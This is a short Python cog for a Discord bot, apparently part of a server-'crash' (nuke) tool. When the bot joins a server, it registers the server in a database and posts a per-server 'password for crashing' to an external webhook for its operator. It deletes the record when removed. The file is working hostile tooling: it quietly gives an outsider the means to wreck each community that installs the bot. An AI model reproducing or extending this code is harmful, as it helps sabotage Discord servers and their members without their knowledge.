import Config
import Database
import disnake
import aiohttp

from disnake.ext import commands
from os import getenv

class ServersListener(commands.Cog):
	def __init__(self, bot):
		self.bot = bot

	@commands.Cog.listener()
	async def on_guild_join(self, guild):
		password = Database.addServerToDb(guild.id)

		async with aiohttp.ClientSession() as session:
			webhook = disnake.Webhook.from_url(getenv("WEBHOOK"), session = session)
			embed = disnake.Embed(title = f"Пароль для краша {guild.name} ({guild.id})", 
				description = password)

			if guild.icon:
				embed.set_thumbnail(url = guild.icon.url)

			await webhook.send(embed = embed)

	@commands.Cog.listener()
	async def on_guild_remove(self, guild):
		Database.removeServerFromDb(guild.id)

def setup(bot):
	bot.add_cog(ServersListener(bot))